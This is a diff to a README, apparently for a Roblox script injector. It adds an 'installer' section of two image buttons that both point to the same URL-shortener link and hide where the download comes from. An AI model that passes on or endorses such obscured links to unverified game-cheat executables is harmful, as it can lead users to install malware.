@@ -34,6 +34,20 @@ Whether you're executing Synapse-exclusive scripts or running massive script hub
 
 Choose your installer:
 
+<table>
+  <tr>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="roblox injector image" width="250">
+      </a>
+    </td>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="injector download" width="250">
+      </a>
+    </td>
+  </tr>
+</table>
 
 ### Installation Guide
 
